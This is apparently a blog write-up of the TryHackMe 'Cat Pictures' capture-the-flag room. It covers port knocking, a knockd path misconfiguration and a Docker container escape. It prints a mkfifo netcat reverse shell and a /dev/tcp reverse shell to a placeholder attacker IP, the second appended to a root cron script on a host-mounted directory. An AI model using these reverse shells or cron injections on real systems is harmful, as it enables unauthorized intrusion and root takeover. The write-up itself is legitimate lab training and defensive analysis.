---
layout: post
mermaid: true
title: "Cat Pictures CTF"
date: 2026-06-24
categories: [ctf]
tags: [thm, docker, docker-escape, port-knocking, knockd, reverseshell, containerescape]
---

## Overview

| | |
|---|---|
| **Platform** | TryHackMe |
| **Difficulty** | Easy |
| **URL** | <a href="https://tryhackme.com/room/catpictures" target="_blank">https://tryhackme.com/room/catpictures</a> |
| **Focus** | Port Knocking misconfiguration and container escape |

This is a straightforward room. The goal is to get access to the target machine and escalate privileges to full control. No flags are discussed here — the focus is entirely on the exploitation techniques and understanding what went wrong with the defensive configuration.

---

## Reconnaissance

Quick port scan:

```bash
nmap -sS -sC -sV -p- <TARGET_IP>

PORT     STATE    SERVICE      VERSION
21/tcp   filtered ftp
22/tcp   open     ssh          OpenSSH 8.2p1
2375/tcp filtered docker
4420/tcp open     nvm-express?
8080/tcp open     http         Apache httpd 2.4.46
```

Three open ports, two filtered. The web server is phpBB. Port 4420 is an "Internal Shell Service" that requires a password. SSH is available but we need credentials first.

---

## Getting In

Browse to the phpBB forum. There's a post that says:

```
POST ALL YOUR CAT PICTURES HERE :)
Knock knock! Magic numbers: 1111, 2222, 3333, 4444
```

This hints at Port Knocking. Try the sequence with knockit:

```bash
python3 knockit.py -d 300 <TARGET_IP> 1111 2222 3333 4444 && sleep 1 && nmap -p21 <TARGET_IP>

PORT   STATE    SERVICE
21/tcp filtered ftp
```

The port is still filtered. Nothing happens. knockit doesn't report errors — it just completes silently. This is frustrating. The sequence seems correct, but the port never opens.

At this point, I have two options: spend hours debugging Port Knocking, or search online to see if anyone else hit this problem. I went with option 2. Turns out, other writeups mention that the password for port 4420 is `sardinethecat`. [I'll investigate why Port Knocking failed later](#port-knocking-investigation) — first, let me get in.

```bash
nc <TARGET_IP> 4420

INTERNAL SHELL SERVICE
Please enter password:
sardinethecat
Password accepted
```

I'm in, but the shell is extremely limited — only `ls`, `cat`, `touch`, and `mkfifo` work. Get a proper bash shell with the mkfifo reverse shell:

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <ATTACKER_IP> 4545 > /tmp/f
```

---

## Finding SSH Credentials

There's a binary called `runme` in `/home/catlover/`. Copy it to your attacker machine and examine it:

```bash
strings runme | grep -iE "password|ssh|rebecca"

rebecca
Please enter yout password:
Welcome, catlover! SSH key transfer queued!
touch /tmp/gibmethesshkey
```

The binary checks for `/tmp/gibmethesshkey` and asks for a password. If both conditions are met, it generates an SSH key:

```bash
touch /tmp/gibmethesshkey
/home/catlover/runme
# Enter password: rebecca

ls -l /home/catlover
-rw-r--r-- 1 0 0 1675 id_rsa
```

Extract the key and SSH in:

```bash
ssh -i id_rsa catlover@<TARGET_IP>

root@7546fa2336d6:/#
```

I'm logged in as root. Something seems off with that hostname.

---

## Discovering the Environment

```bash
ls -la /

-rwxr-xr-x 1 root root 0 .dockerenv
```

That file shouldn't be there. Check the mounted filesystems:

```bash
df -h

/dev/xvda1       20G   11G  8.4G  55% /opt/clean
```

Wait — `/dev/xvda1` is the host's disk, and it's mounted here at `/opt/clean`. Let's see what's there:

```bash
cat /opt/clean/clean.sh

#!/bin/bash
rm -rf /tmp/*
```

A cleanup script. Now check the crontab:

```bash
cat /etc/crontab

*/2 * * * * root /bin/bash /opt/clean/clean.sh >/dev/null 2>&1
```

**This is the vulnerability.** The script runs every 2 minutes as root. And we can modify it because we have write access to `/opt/clean`.

Append a reverse shell:

```bash
echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/8080 0>&1' >> /opt/clean/clean.sh
```

Set up a listener:

```bash
nc -lvnp 8080
```

Wait up to 2 minutes:

```bash
connect to [<ATTACKER_IP>] from (UNKNOWN) [<TARGET_IP>] 52174
root@ip-10-128-184-85:~#
```

Root on the host. I've escaped.

---

## The Interesting Part: Why Port Knocking Failed {#port-knocking-investigation}

Now that we have host access, let's investigate the Port Knocking configuration. I tried knockit earlier and it did nothing. First, check the knockd config:

```bash
cat /etc/knockd.conf

[options]
        UseSyslog
[openFTP]
        sequence    = 1111,2222,3333,4444
        seq_timeout = 15
        command     = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 21 -j ACCEPT && iptables -D INPUT -p tcp --dport 21 -j REJECT
        tcpflags    = syn
```

The configuration looks correct. Now check the logs:

```bash
grep knockd /var/log/syslog | tail -10

Jun 21 09:24:43 knockd: openFTP: Stage 1
Jun 21 09:24:43 knockd: openFTP: Stage 2
Jun 21 09:24:43 knockd: openFTP: Stage 3
Jun 21 09:24:43 knockd: openFTP: Stage 4
Jun 21 09:24:43 knockd: openFTP: OPEN SESAME
Jun 21 09:24:43 knockd: sh: 1: /sbin/iptables: not found
Jun 21 09:24:43 knockd: command returned non-zero status code (127)
```

**There it is.** knockd detected the sequence perfectly (`OPEN SESAME`) but failed to execute the command because `/sbin/iptables` doesn't exist.

Check where iptables actually is:

```bash
which iptables
/usr/sbin/iptables
```

In modern Ubuntu, `iptables` moved from `/sbin/` to `/usr/sbin/`. The knockd config is old and hardcoded to the wrong path. The binary path is incorrect, so the command fails silently.

### Why This Matters

From the attacker's perspective, **nothing happened**. knockit completed without errors, nmap showed the port still filtered, no error messages anywhere. The failure was completely invisible on the outside. You only find it by reading `/var/log/syslog` and looking for exit code 127 (command not found).

This is a **silent misconfiguration** — the kind that breaks in production and nobody knows why.

### The Fix

```bash
sed -i 's|/sbin/iptables|/usr/sbin/iptables|g' /etc/knockd.conf
killall knockd
/usr/sbin/knockd -i eth0
```

Now test it:

```bash
python3 knockit.py -d 300 <TARGET_IP> 1111 2222 3333 4444 && sleep 1 && nmap -p21 <TARGET_IP>

PORT   STATE SERVICE
21/tcp open  ftp
```

Port 21 opens immediately. One line fix. Massive impact.

---

## Attack Flow

<div class="mermaid">
graph TD
    A["nmap scan"] --> B["Port 8080<br/>phpBB forum"]
    B --> C["Post hint<br/>Port Knocking 1111 2222 3333 4444"]
    C --> D["knockit attempt<br/>fails silently"]
    D --> E["External research<br/>password sardinethecat"]
    E --> F["Port 4420 shell<br/>limited environment"]
    F --> G["Reverse shell<br/>mkfifo to bash"]
    G --> H["Binary runme<br/>strings analysis"]
    H --> I["SSH key generation<br/>password rebecca"]
    I --> J["SSH login<br/>second container as root"]
    J --> K["Discover /opt/clean<br/>mounted from host"]
    K --> L["Cron job injection<br/>reverse shell payload"]
    L --> M["Root on host<br/>escape complete"]
    M --> N["Investigate knockd logs<br/>find iptables path bug"]
</div>

---

## Key Takeaways

**Silent failures are the worst kind.** Port Knocking worked perfectly from knockd's perspective — it detected the sequence, logged success, executed the command... which failed to find a binary. From outside the server, it looks completely broken. Always check `/var/log/syslog` when something that should work doesn't.

**Configuration mistakes live forever.** This config was probably written 5+ years ago for an older Ubuntu version. When the system updated, nobody updated the knockd config. Now it silently fails on every attempt. It's a good reminder that hardcoded paths and old configurations need auditing.

**Mounted directories from the host can be escape vectors.** If you mount a directory and run something from it as root, the container can inject code that executes with host privileges. A simple `ro` (read-only) flag would have prevented this entirely.

